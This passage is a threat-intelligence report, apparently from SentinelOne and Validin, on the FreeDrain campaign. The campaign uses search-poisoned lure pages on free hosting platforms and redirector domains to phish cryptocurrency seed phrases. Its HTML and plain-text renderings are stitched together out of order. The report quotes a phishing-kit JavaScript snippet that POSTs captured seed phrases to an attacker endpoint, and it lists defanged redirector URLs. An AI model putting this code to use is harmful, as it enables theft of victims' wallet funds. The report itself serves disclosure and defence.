aria-level=\"1\">Teachable (teachable.com)</li>\n<li aria-level=\"1\">Github.io</li>\n<li aria-level=\"1\">Strikingly (mystrikingly.com)</li>\n<li aria-level=\"1\">WordPress.com</li>\n<li aria-level=\"1\">Weebly.com</li>\n<li aria-level=\"1\">GoDaddySites (godaddysites.com)</li>\n<li aria-level=\"1\">Educator Pages (educatorpages.com)</li>\n<li aria-level=\"1\">Webador (webador.com)</li>\n</ul>\n<figure id=\"attachment_121019\" aria-describedby=\"caption-attachment-121019\" style=\"width: 1999px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18.jpg\" alt=\"Breakdown of total domains to suspected URLs, to Confirmed URLs by quantity\" width=\"1999\" height=\"1180\" class=\"size-full wp-image-121019\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_18-1536x907.jpg 1536w\" sizes=\"auto, (max-width: 1999px) 100vw, 1999px\" /><figcaption id=\"caption-attachment-121019\" class=\"wp-caption-text\">Breakdown of total domains to suspected URLs, to Confirmed URLs by quantity</figcaption></figure>\n<p>The volume and spread across legitimate platforms further highlights how FreeDrain relies on the low-friction, high-trust nature of these services to evade detection and amplify reach.</p>\n<p>To go beyond static discovery, we implemented scheduled re-crawls of every suspected lure page. This allowed us to track:</p>\n<ul>\n<li aria-level=\"1\">Content updates over time</li>\n<li aria-level=\"1\">Changes in redirect behavior</li>\n<li aria-level=\"1\">New final-stage phishing URLs being introduced</li>\n<li aria-level=\"1\">Takedowns and domain churn</li>\n</ul>\n<p>This gave us a clearer picture of FreeDrain&#8217;s infrastructure lifecycle, from initial lure page creation to eventual takedown or abandonment, which helped us understand the rotation strategies used to keep malicious links live and searchable.</p>\n<h2>Lure Page Breakdown</h2>\n<p>Despite being spread across a wide array of publishing platforms, FreeDrain lure pages followed a remarkably consistent structure, carefully optimized to appear helpful and legitimate, while subtly guiding victims toward compromise.</p>\n<h3>Common Elements Observed Across Lure Pages</h3>\n<p>Across <code>gitbook.io</code>, <code>webflow.io</code>, <code>github.io</code>, and others, the pages typically included:</p>\n<ul>\n<li aria-level=\"1\">A single, large, clickable image occupying most of the viewport\n<ul>\n<li aria-level=\"2\">This image was a screenshot of a legitimate cryptocurrency site (e.g., Trezor, Metamask, or Ledger)</li>\n<li aria-level=\"2\">The image linked externally, usually to a malicious redirection chain</li>\n</ul>\n</li>\n<li aria-level=\"1\">AI-generated help content positioned below the image\n<ul>\n<li aria-level=\"2\">The text answered common user queries like <i>&#8220;How do I check my wallet balance on Trezor?&#8221;</i></li>\n</ul>\n</li>\n<li aria-level=\"1\">1–2 additional embedded links, which pointed to the same external destination as the image or were placeholders like <code>\"#\"</code></li>\n</ul>\n<h3>Link Behavior: Redirection Variability</h3>\n<p>Clicking the image or associated links triggered unpredictable outcomes, depending on the time, user agent, or page freshness:</p>\n<ul>\n<li aria-level=\"1\">Redirection through one or more intermediary domains (typically 1–5 hops)</li>\n<li aria-level=\"1\">Final destinations varied widely:\n<ul>\n<li aria-level=\"2\">A phishing page built to capture wallet seed phrases (hosted on Azure or AWS S3)</li>\n<li aria-level=\"2\">A legitimate site like trezor.io or metamask.io, creating false reassurance</li>\n<li aria-level=\"2\">A non-functional domain (404 or NXDOMAIN)</li>\n<li aria-level=\"2\">The current page itself (<code>\"#\"</code>) acting as a placeholder when infrastructure wasn’t active</li>\n</ul>\n</li>\n</ul>\n<p>This redirection behavior made classification challenging, especially since not every page led directly to a phishing endpoint in every instance.We observed that lure pages initially hosted benign content before being modified to include malicious redirects usually weeks or months later. This aging tactic likely helped the sites build trust and survive longer before being flagged or removed.</p>\n<figure id=\"attachment_121028\" aria-describedby=\"caption-attachment-121028\" style=\"width: 1224px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1.jpg\" alt=\"A Github lure page that has just been changed from benign to malicious\" width=\"1224\" height=\"793\" class=\"size-full wp-image-121028\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1.jpg 1224w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-300x194.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-1024x663.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_1-768x498.jpg 768w\" sizes=\"auto, (max-width: 1224px) 100vw, 1224px\" /><figcaption id=\"caption-attachment-121028\" class=\"wp-caption-text\">A Github lure page that has just been changed from benign to malicious</figcaption></figure>\n<h3>Obfuscation Through Variation</h3>\n<p>Identifying FreeDrain lure pages at scale proved difficult due to extreme variation in phrasing, metadata, and platform-specific formatting.

Full examples are provided in the appendix, but a snippet of the POST request is below (domain bolded and defanged):</p>\n<pre>\r\nconst data = {};\r\ninputs.forEach((input, index) => {\r\n    data[`phrase${index}`] = input.value.trim();\r\n});\r\ndata.subject = \"Trezor connect2\";\r\ndata.message = \"Successfull fetch data\";\r\n$.ajax({\r\n    type: \"POST\",\r\n    url: \"<b>https://rfhwuwixxi.execute-api.us-east-1.amazonaws[.]com/prod/eappmail</b>\",\r\n    dataType: \"json\",\r\n    crossDomain: true,\r\n    contentType: \"application/json; charset=utf-8\",\r\n    data: JSON.stringify(data),\r\n    success: function (result) {\r\n        alert('Data submitted successfully1!');\r\n        window.location.href = 'https://suite.trezor.io/web/';\r\n        location.reload();\r\n    },\r\n    error: function (xhr, status, error) {\r\n        window.location.href = 'https://suite.trezor.io/web/';\r\n&nbsp;\r\n&nbsp;\r\n}\r\n});\r\n</pre>\n<p>Despite its simplicity, the phishing backend was effective, disposable, and often difficult to trace—highlighting just how low the bar is for technical sophistication when paired with wide-scale reach and persistent lure infrastructure.</p>\n<h2>Actor Analysis</h2>\n<p>Attribution is inherently difficult when infrastructure is ephemeral and built on shared, free-tier services. Yet through a combination of repository metadata, behavioral signals, and timing artifacts, we were able to extract meaningful insights about FreeDrain&#8217;s operators, including likely location, working patterns, and their degree of operational coordination.</p>\n<p>Our first major breakthrough came from GitHub Pages (<code>github.io</code>), which only allows hosting via a public repository that matches the account’s GitHub username (e.g., <code>username.github.io</code>). This constraint meant every active FreeDrain lure page hosted on GitHub had a publicly accessible repository behind it.</p>\n<p>We cloned hundreds of these repositories and analyzed the commit metadata, including timestamps, usernames, email addresses, and whether commits were made via the CLI or web interface. Several clear patterns emerged:</p>\n<ul>\n<li aria-level=\"1\">Email addresses were always unique, tied 1:1 with the GitHub account, and never reused.</li>\n<li aria-level=\"1\">All emails came from free providers like Gmail, Hotmail, Outlook, and ProtonMail.</li>\n<li aria-level=\"1\">While naming styles varied widely (capitalization, numbers, patterns), we found clusters of similarly structured addresses, suggesting manual creation by multiple individuals, possibly using shared templates or naming approach.</li>\n</ul>\n<figure id=\"attachment_121014\" aria-describedby=\"caption-attachment-121014\" style=\"width: 366px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22.jpg\" alt=\"Sample of email addresses found in FreeDrain-associated Github commit\" width=\"366\" height=\"632\" class=\"size-full wp-image-121014\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22.jpg 366w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22-174x300.jpg 174w\" sizes=\"auto, (max-width: 366px) 100vw, 366px\" /><figcaption id=\"caption-attachment-121014\" class=\"wp-caption-text\">Sample of email addresses found in FreeDrain-associated Github commit</figcaption></figure>\n<p>Importantly, GitHub commits preserve the local timezone of the user unless manually configured otherwise.

Webflow, for instance, embeds a &#8220;last published&#8221; timestamp in the HTML source of hosted sites. When we aggregated timestamps across the many FreeDrain Webflow pages, a clear 9-to-5 weekday work pattern emerged, complete with a consistent midday break. This pattern aligns closely with a standard business schedule in the IST timezone.</p>\n<figure id=\"attachment_121025\" aria-describedby=\"caption-attachment-121025\" style=\"width: 1999px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12.jpg\" alt=\"Aggregated Webflow publish times show an exceptionally clear weekday work pattern in UTC+05:30\" width=\"1999\" height=\"1180\" class=\"size-full wp-image-121025\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-1536x907.jpg 1536w\" sizes=\"auto, (max-width: 1999px) 100vw, 1999px\" /><figcaption id=\"caption-attachment-121025\" class=\"wp-caption-text\">Aggregated Webflow publish times show an exceptionally clear weekday work pattern in UTC+05:30</figcaption></figure>\n<figure id=\"attachment_121013\" aria-describedby=\"caption-attachment-121013\" style=\"width: 1055px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23.jpg\" alt=\"Webflow embeds publish timestamps into the HTML source code of published websites\" width=\"1055\" height=\"598\" class=\"size-full wp-image-121013\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23.jpg 1055w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-300x170.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-1024x580.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-768x435.jpg 768w\" sizes=\"auto, (max-width: 1055px) 100vw, 1055px\" /><figcaption id=\"caption-attachment-121013\" class=\"wp-caption-text\">Webflow embeds publish timestamps into the HTML source code of published websites</figcaption></figure>\n<p>Combining these and other signals across platforms, we assess with high confidence that FreeDrain is operated by individuals based in the IST timezone, likely in India, working standard weekday hours.</p>\n<p>Additionally, timeline analysis shows that FreeDrain has been active since at least 2022, with a notable acceleration in mid-2024. As of this writing, the campaign remains active across several free hosting and publishing platforms.</p>\n<figure id=\"attachment_121011\" aria-describedby=\"caption-attachment-121011\" style=\"width: 1999px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25.jpg\" alt=\"Confirmed “last published” times, by date\" width=\"1999\" height=\"1180\" class=\"size-full wp-image-121011\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-1536x907.jpg 1536w\" sizes=\"auto, (max-width: 1999px) 100vw, 1999px\" /><figcaption id=\"caption-attachment-121011\" class=\"wp-caption-text\">Confirmed “last published” times, by date</figcaption></figure>\n<h2>Disruption Efforts and Opportunities</h2>\n<p>The scale and diversity of services abused by FreeDrain made disruption an ongoing challenge. While the campaign leaned heavily on free-tier platforms, many of which allowed users to publish images, text, external links, and even custom JavaScript to subdomains under well-known parent domains, very few of these platforms offered streamlined abuse reporting workflows.</p>\n<p>In most cases, there was no direct method to report malicious content from the content page itself, forcing us to manually investigate each platform’s policies, support forms, or contact channels. This adds unnecessary friction to the response process, especially when scaled across hundreds of active malicious pages.</p>\n<p>Even more concerning, most of the publishing platforms lacked the detection capabilities to identify this type of coordinated abuse on their own. The indicators were there: repetitive naming patterns, clustered behavior, identical templates reused across subdomains, but limited proactive action was being taken.</p>\n<p>This highlights a broader industry need:</p>\n<ul>\n<li>Free-tier content platforms should invest in basic abuse prevention tooling and more accessible reporting mechanisms.</li>\n</ul>\n<p>At minimum, this includes:</p>\n<ul>\n<li aria-level=\"1\">Allowing abuse to be reported directly from published content pages</li>\n<li aria-level=\"1\">Monitoring for patterns of misuse (e.g., bulk account creation, similar domain structures, repeated hosting of external phishing kits)</li>\n<li aria-level=\"1\">Establishing direct communication lines with trusted threat intel analysts and threat researchers</li>\n</ul>\n<p>FreeDrain’s reliance on free-tier platforms is not unique, and without better safeguards, these services will continue to be weaponized at scale.</p>\n<p>This isn’t just a security issue, it’s a business one. When threat actors abuse these platforms to host phishing pages, fake login portals, or crypto scams, they erode user trust in the entire platform domain. Over time, this leads to real financial consequences:</p>\n<ul>\n<li aria-level=\"1\"><strong>Reputation damage:</strong> Reputable domain names like <code>webflow.io</code>, and <code>teachable.com</code> can quickly become flagged by corporate security tools, browser warning systems, and threat intelligence feeds. This reduces their utility for legitimate users and undermines the brand’s credibility.</li>\n<li aria-level=\"1\"><strong>Deliverability and discoverability</strong>: Once a platform’s domain is associated with widespread abuse, search engines, email providers, and social networks may down-rank or block links from that domain, hurting all users, including paying customers.</li>\n<li aria-level=\"1\"><strong>Customer churn and support burden</strong>: Abuse-driven issues often result in a higher volume of customer support tickets, complaints, and refunds, particularly when paying users find their content mistakenly flagged or blocked due to a shared domain reputation.</li>\n<li aria-level=\"1\"><strong>Increased infrastructure and fraud costs</strong>: Hosting abusive content, even at scale on free tiers, still consumes compute, storage, and bandwidth. Worse, it may attract waves of automated account signups and resource abuse that raise operational costs.</li>\n</ul>\n<p>Failing to detect and mitigate this kind of abuse isn’t just a user risk– it’s an unpaid tax on the business, dragging down growth and trust at every layer. Proactive abuse prevention and streamlined reporting are not just table stakes for security, they’re critical to long-term sustainability.</p>\n<h2>References and Similarities to Other Campaigns</h2>\n<p>Elements of the FreeDrain campaign were first publicly documented in <a href=\"https://www.netskope.com/blog/abusing-google-sites-and-microsoft-azure-for-crypto-phishing\" target=\"_blank\" rel=\"noopener noreferrer\">August 2022 by Netskope</a>, with <a href=\"https://www.netskope.com/blog/attackers-continue-to-abuse-google-sites-and-microsoft-azure-to-host-cryptocurrency-phishing\" target=\"_blank\" rel=\"noopener noreferrer\">a follow-up report</a> in September 2022. Netskope’s early findings captured the core tactics that continue today: leveraging SEO manipulation to drive traffic to lure pages, which then redirect to credential-harvesting phishing sites. Netskope also published another <a href=\"https://www.netskope.com/blog/attackers-target-crypto-wallets-using-codeless-webflow-phishing-pages\" target=\"_blank\" rel=\"noopener noreferrer\">update in October 2024</a>, focusing on FreeDrain’s use of Webflow-hosted infrastructure, confirming the campaign’s continued evolution while retaining the same fundamental workflow.</p>\n<p>FreeDrain’s abuse of legitimate free-tier platforms is part of a broader trend in phishing infrastructure, but it remains distinct from other well-known crypto phishing efforts. For example, the CryptoCore campaign, <a href=\"https://decoded.avast.io/martinchlumecky1/cryptocore-unmasking-the-sophisticated-cryptocurrency-scam-operations/\" target=\"_blank\" rel=\"noopener noreferrer\">reported by Avast</a> in August 2024, similarly targets cryptocurrency users but relies heavily on YouTube content and impersonation videos to draw in victims, rather than search engine poisoning and static phishing sites.</p>\n<p>In 2023, <a href=\"https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/its-raining-phish-and-scams-how-cloudflare-pages-dev-and-workers-dev-domains-get-abused/\" target=\"_blank\" rel=\"noopener noreferrer\">Trustwave reported</a> on the use of Cloudflare’s pages.dev and workers.dev services in phishing, showing how modern hosting platforms that offer free, customizable subdomains with minimal friction are being systematically exploited, mirroring FreeDrain’s approach.</p>\n<p>Recent reporting has also shed light on the kinds of threat actors that may be behind campaigns like FreeDrain. Just this week, the U.S. Treasury<a href=\"https://home.treasury.gov/news/press-releases/sb0129\" target=\"_blank\" rel=\"noopener noreferrer\"> sanctioned individuals linked to cyber scam operations in Southeast Asia</a>, specifically a militia group in Burma involved in online fraud networks. While distinct from FreeDrain, these operations share similar hallmarks: large-scale abuse of online infrastructure, technical capability, and a focus on financial theft, demonstrating the scale and organization such campaigns can operate under.</p>\n<p>FreeDrain’s techniques have also been informally documented by affected users. In particular, Trezor hardware wallet customers have reported fraudulent websites mimicking the Trezor ecosystem, some of which were part of FreeDrain’s infrastructure:</p>\n<ul>\n<li aria-level=\"1\"><a href=\"https://forum.trezor.io/t/reporting-scam-site/20284\" target=\"_blank\" rel=\"noopener noreferrer\">Forum report: Reporting scam site</a></li>\n<li aria-level=\"1\"><a href=\"https://forum.trezor.io/t/fake-trezor-websites/173/5\" target=\"_blank\" rel=\"noopener noreferrer\">Forum discussion: Fake Trezor websites</a></li>\n</ul>\n<h2>Conclusion</h2>\n<p>The FreeDrain network represents a modern blueprint for scalable phishing operations, one that thrives on free-tier platforms, evades traditional abuse detection methods, and adapts rapidly to infrastructure takedowns. By abusing dozens of legitimate services to host content, distribute lure pages, and route victims, FreeDrain has built a resilient ecosystem that’s difficult to disrupt and easy to rebuild.</p>\n<p>Through detailed infrastructure analysis, repository metadata mining, and cross-platform behavioral correlations, we uncovered rare insights into the actors behind the campaign, including strong indicators that the operation is manually run by a group based in the UTC+05:30 timezone, working standard business hours. Despite this visibility, systemic weaknesses in reporting mechanisms and abuse detection have allowed FreeDrain to persist and even accelerate in 2024.</p>\n<p>This is not just a FreeDrain problem. The broader ecosystem of free publishing platforms is being exploited in ways that disproportionately benefit financially motivated threat actors. Without stronger default safeguards, identity verification, or abuse response infrastructure, these services will continue to be abused, undermining user trust and inflicting real-world financial harm.</p>\n<p>By exposing the scale and structure of the FreeDrain network, we hope this research will enable better platform-level defenses, more informed user education, and collaboration across the security community to limit the reach and longevity of operations like this.</p>\n<h2>Indicators of Compromise and Relations</h2>\n<p><a

What began as an investigation into a single phishing page quickly uncovered a vast, coordinated campaign weaponizing search engine optimization, free-tier web services, and layered redirection techniques to systematically target and drain cryptocurrency wallets at scale.\nIn this collaborative blog, we detail the technical anatomy of the FreeDrain operation from the discovery process and infrastructure mapping to evasion techniques and the end-to-end workflow attackers use to funnel victims through multilayered financial theft paths. We also walk through the custom tooling we built to hunt, track, and monitor this large campaign in real time.\nOur findings highlight the growing sophistication of financially motivated threat actors and the systemic risks posed by under-moderated publishing platforms. This research underscores the need for adaptive detection, proactive monitoring, and tighter safeguards across the ecosystem to disrupt threats like FreeDrain before they scale.\nThe Plea for Help\nOur investigation into what would become the FreeDrain Network began on May 12, 2024, when Validin received a message from a distressed individual who had lost approximately 8 BTC, worth around $500,000 at the time. The victim had unknowingly submitted their wallet seed phrase to a phishing site while attempting to check their wallet balance, after clicking on a highly-ranked search engine result.\nRequest for help after successful phish\nThe individual had come across a Validin blog post from April 2024, which documented a series of crypto-draining phishing pages. The phishing site they encountered shared striking similarities to the infrastructure we had analyzed—specifically, pages hosted on azurewebsites[.]net, along with additional dedicated domain names.\nTrusted cryptocurrency tracking analysts confirmed that the destination wallet used to receive the victim’s funds was a one-time-use address. The stolen assets were quickly moved through a cryptocurrency mixer, an obfuscation method that fragments and launders funds across multiple transactions, making attribution and recovery nearly impossible.\nWhile we weren’t able to assist in recovering the lost assets, this outreach marked a turning point. It became clear that the incident was not isolated. We set out to uncover the infrastructure behind the scam and understand the broader operation enabling these thefts to occur at scale.\nCracking the Surface – Our First Look at FreeDrain\nWhen Valdin published the initial findings in April 2024, one key piece of the puzzle remained unclear: how were these phishing pages reaching victims at scale? While common delivery methods like phishing emails, SMS (smishing), social media posts, and blog comment spam are frequently used in cryptocurrency scams, none appeared to be the source in this case.\nThat changed with the report from the victim in May. They had encountered the phishing site via a top-ranked search engine result, not a suspicious message or unsolicited link.\nCurious whether we could reproduce the victim’s experience, we conducted a series of keyword searches ourselves. The results were startling.\nSearch terms like “Trezor wallet balance” returned multiple malicious results across Google, Bing, and DuckDuckGo, often within the first few result pages.\nTrezor Wallet Balance malicious result in DuckDuckGo\nTrezor Wallet Balance malicious result in top Bing Search\nTrezor Wallet Balance malicious result in Top Google Search result\nThese were not obscure or poorly maintained phishing sites; they were professionally crafted lure pages freely hosted on subdomains of trusted platforms like gitbook.io, webflow.io, and github.io.\nThis discovery marked our first real glimpse into the scale and sophistication of the FreeDrain campaign—and raised a host of new questions. Specifically, what is the overall workflow once a victim visits the site, how are these pages becoming so highly ranked, and what can we discover about the attackers themselves?\nWorkflow – A Victim’s Path to Compromise\nTo understand how victims were being funneled into this operation and the post-visit workflow, we checked out the top-ranked search results that we knew weren’t connected to authoritative, legitimate websites, looking for malicious behavior. Within minutes, we encountered related live phishing pages, and quickly began piecing together the end-to-end workflow that a typical victim might experience.\nThe attack chain was deceptively simple:\nSearch for wallet-related queries (e.g., “Trezor wallet balance”) on a major search engine.\nClick a high-ranking result, often hosted on a seemingly trustworthy platform like gitbook.io or webflow.io.\nLand on a page displaying a large, clickable image, a static screenshot of the legitimate wallet interface.\nClick the image, which either:\n\nRedirects the user to legitimate websites.\nRedirects the user through one or more intermediary sites\nDirectly leads to a phishing page.\nArrive at the final phishing site, a near-perfect clone of the real wallet service, prompting the user to input their seed phrase.\nAttack chain summary\nThe entire flow is frictionless by design, blending SEO manipulation, familiar visual elements, and platform trust to lull victims into a false sense of legitimacy. And once a seed phrase is submitted, the attacker’s automated infrastructure will drain funds within minutes.\nLure page linking to phishing page\nRedirect to legitimate site\nLure Page Ranking – Weaponizing SEO\nWe were stunned by the sheer volume of lure pages appearing among top-ranked search results across all major search engines. These weren’t complex, multi-layered scams. In most cases, the pages consisted of just a single large image (again, usually a screenshot of a legitimate crypto wallet interface) followed by a few lines of text that offered seemingly helpful instructions, ironically, some even claimed to educate users on how to avoid phishing.\nThis type of simplistic, Q&A-style content is well-known in SEO circles for being rewarded by search engine algorithms. Because users often turn to search engines for direct answers, pages that appear to offer guidance, even when malicious, can be algorithmically elevated in rankings, especially when hosted on high-reputation platforms.\nIn our early investigation (May–June 2024), we found that many of these lure pages were hosted on services like webflow.io and gitbook.io. Both platforms provide low-friction publishing, enabling anyone to spin up a custom subdomain and publish arbitrary content for free. The subdomains used followed familiar spammer patterns, frequent use of hyphens, deliberate misspellings, and keyword stuffing to manufacture variation and dodge blacklisting.\nSubdomain naming scheme similarities\nGenerative AI as a Tool for Scale\nThe text on many lure pages bore clear signs of having been generated by large language models. We found copy-paste artifacts that revealed the specific tools used, most notably, strings like “4o mini”, a likely reference to OpenAI’s GPT-4o mini model. These telltale traces suggest that FreeDrain operators are leveraging generative AI not only to create scalable content but doing so carelessly at times.\nFake content mistakenly including OpenAI GPT-4o mini reference\nFreeDrain’s Secret Weapon – Spamdexing\nBut content alone doesn’t explain how these pages were getting indexed and ranked above legitimate sources. How were search engines even discovering them?\nThe answer came when we identified several indexed URLs pointing back to high-ranking lure pages, and traced them to massive comment spam campaigns. FreeDrain operators appear to be heavily abusing neglected web properties that allow open or weakly-moderated comments, flooding them with links pointing to their lure pages. This old tactic, known as spamdexing, is a well-documented SEO abuse technique, which FreeDrain makes heavy use of as one of the ways to attempt to game SEO.\nIn one striking example, we found a Korean university photo album page with a single image uploaded over a decade ago, buried under 26,000 comments, nearly all of them containing spam links.\nFreeDrain uses large-scale comment spam on poorly-maintained websites to boost the visibility of their lure pages via search engine indexing\nThis technique allows FreeDrain to sidestep traditional delivery vectors like phishing emails or malicious ads, instead meeting victims exactly where they’re looking, at the top of trusted search engines.\nTracking Search Results\nUnderstanding how FreeDrain’s lure pages consistently climbed to the top of search results became a key investigative goal, and it demanded custom tooling.\nWe built a purpose-specific crawler designed solely to emulate search engine queries, navigate through pages of search results, and extract structured data from each result: URLs, page titles, and text content summaries. The goal was to systematically monitor how malicious pages were ranking, shifting, and proliferating over time.\nWe ran this system daily across 700 unique keyword permutations, capturing up to 40 pages deep per search query, per search engine. This daily monitoring provided a dynamic, longitudinal view into the visibility of FreeDrain’s infrastructure.\nThe Scale of Abuse\nAfter four months of collection, we amassed a dataset of more than 200,000 unique URLs, drawn from topical search results across at least a dozen different publishing platforms that allow users to create custom subdomains. Aggressively filtering, we identified over 38,000 distinct FreeDrain subdomains hosting the lure pages.\nThese subdomains appeared on well-known free hosting and publishing platforms, including:\nGitbook (gitbook.io)\nWebflow (webflow.io)\nTeachable (teachable.com)\nGithub.io\nStrikingly (mystrikingly.com)\nWordPress.com\nWeebly.com\nGoDaddySites (godaddysites.com)\nEducator Pages (educatorpages.com)\nWebador (webador.com)\nBreakdown of total domains to suspected URLs, to Confirmed URLs by quantity\nThe volume and spread across legitimate platforms further highlights how FreeDrain relies on the low-friction, high-trust nature of these services to evade detection and amplify reach.\nTo go beyond static discovery, we implemented scheduled re-crawls of every suspected lure page. This allowed us to track:\nContent updates over time\nChanges in redirect behavior\nNew final-stage phishing URLs being introduced\nTakedowns and domain churn\nThis gave us a clearer picture of FreeDrain’s infrastructure lifecycle, from initial lure page creation to eventual takedown or abandonment, which helped us understand the rotation strategies used to keep malicious links live and searchable.\nLure Page Breakdown\nDespite being spread across a wide array of publishing platforms, FreeDrain lure pages followed a remarkably consistent structure, carefully optimized to appear helpful and legitimate, while subtly guiding victims toward compromise.\nCommon Elements Observed Across Lure Pages\nAcross gitbook.io, webflow.io, github.io, and others, the pages typically included:\nA single, large, clickable image occupying most of the viewport\n\nThis image was a screenshot of a legitimate cryptocurrency site (e.g., Trezor, Metamask, or Ledger)\nThe image linked externally, usually to a malicious redirection chain\nAI-generated help content positioned below the image\n\nThe text answered common user queries like “How do I check my wallet balance on Trezor?”\n1–2 additional embedded links, which pointed to the same external destination as the image or were placeholders like \"#\"\nLink Behavior: Redirection Variability\nClicking the image or associated links triggered unpredictable outcomes, depending on the time, user agent, or page freshness:\nRedirection through one or more intermediary domains (typically 1–5 hops)\nFinal destinations varied widely:\n\nA phishing page built to capture wallet seed phrases (hosted on Azure or AWS S3)\nA legitimate site like trezor.io or metamask.io, creating false reassurance\nA non-functional domain (404 or NXDOMAIN)\nThe current page itself (\"#\") acting as a placeholder when infrastructure wasn’t active\nThis redirection behavior made classification challenging, especially since not every page led directly to a phishing endpoint in every instance.We observed that lure pages initially hosted benign content before being modified to include malicious redirects usually weeks or months later. This aging tactic likely helped the sites build trust and survive longer before being flagged or removed.\nA Github lure page that has just been changed from benign to malicious\nObfuscation Through Variation\nIdentifying FreeDrain lure pages at scale proved difficult due to extreme variation in phrasing, metadata, and platform-specific formatting. For example, we identified 46 unique renderings of the word “Trezor”, all visually similar, using tricks like added Unicode characters, zero-width spaces, and mixed script alphabets.\nTrezor variation heatmap by quantity\n\nSnippets of pages hosted on github\\.io with content clearly generated using other tools, for example, “Mobrise Website Builder”\nA turning point in connecting these fragmented domains came from pivoting off the redirection infrastructure. While the lure content varied, the redirectors often remained consistent across pages and platforms.\nValidin result showing redirector abusing free services\nBy tracing traffic from anchor links to known FreeDrain redirectors, we were able to map common ownership and activity across otherwise-unrelated services. This infrastructure-based pivot became essential for clustering and attribution, bridging gaps that the lure content itself couldn’t.\nRedirectors\nPivoting on URLs from known and suspected FreeDrain lure pages that we were monitoring, we quickly noticed some noteworthy patterns in the FreeDrain redirection domains.\nDomain Characteristics\nNearly all redirector domains shared several features:\n.com TLDs exclusively\nNames that appeared algorithmically generated, likely via a Domain Generation Algorithm (DGA) or Markov chain model\nEnglish-adjacent structure, visually familiar but never forming real English words\nExamples include:\nantressmirestos[.]com\nshotheatsgnovel[.]com\nbildherrywation[.]com\nEach URL also included a GUID-like string in the path, which may have served as a session ID, traffic source identifier, or logic gate for redirection behavior. Examples:\nhttps://causesconighty[.]com/ce405b14-337a-43a5-9007-ed1aaf807998\nhttps://causesconighty[.]com/d7c95729-6eed-452a-b246-865e0d97fc23\nhttps://disantumcomptions[.]com/61e7fc9c-baef-43f0-82bf-a7f12a025586\nhttps://disantumcomptions[.]com/6c31ec3b-0d4b-4bf4-a9f4-91453c4ef99e\nhttps://distrypromited[.]com/d7c95729-6eed-452a-b246-865e0d97fc23\nhttps://distrypromited[.]com/ff933705-9619-4292-9e22-02269acc197b\nhttps://posectsinsive[.]com/9431711a-cf35-4ebd-b5db-eacba9ef7ee3\nhttps://posectsinsive[.]com/994ffe2a-21fb-448a-b4e3-01b9483c5460\n(A complete list of FreeDrain-associated redirector domains is provided in the appendix.)\nDomain Registration and Infrastructure Clues\nAll domains we identified were registered via Key-Systems GmbH, a registrar often used for bulk domain purchases and programmatic registration.\nInitially, we suspected that these domains were all managed by the FreeDrain operators as well, but have since connected these domains to a much larger network of thousands domain names that are used to route traffic for many different purposes.\nLooking at DNS history for some of the older redirectors on our list, we saw that they rotated IP addresses relatively infrequently, resolving to just a small number of IPs within a time window of weeks to months.\nDNS history for scientcontopped[.]com prior to expiration (2024)\nThe domain resolved to only a handful of IPs over its active life suggesting stable, centralized hosting infrastructure.\nPivoting on IP addresses shared by these older FreeDrain domains revealed that there are hundreds of other domain names that share nearly identical characteristics in terms of naming conventions, registration patterns, and hosting patterns. Yet, these other domains didn’t exhibit direct ties to FreeDrain behavior.\nPivot from confirmed FreeDrain redirector (yellow asterisk) reveals broader domain ecosystem with matching infrastructure traits\nThis led us to two possibilities:\nThe redirectors are part of a leased infrastructure-as-a-service model, used by FreeDrain and potentially many other threat actors\nFreeDrain is a subdivision of a broader operation, with shared tooling and infrastructure but distinct campaigns\nAt this stage, the full extent of this infrastructure and the relationships between campaigns remain an open research question. What is clear, however, is that FreeDrain does not operate in isolation, and the redirection layer may be a service used by multiple 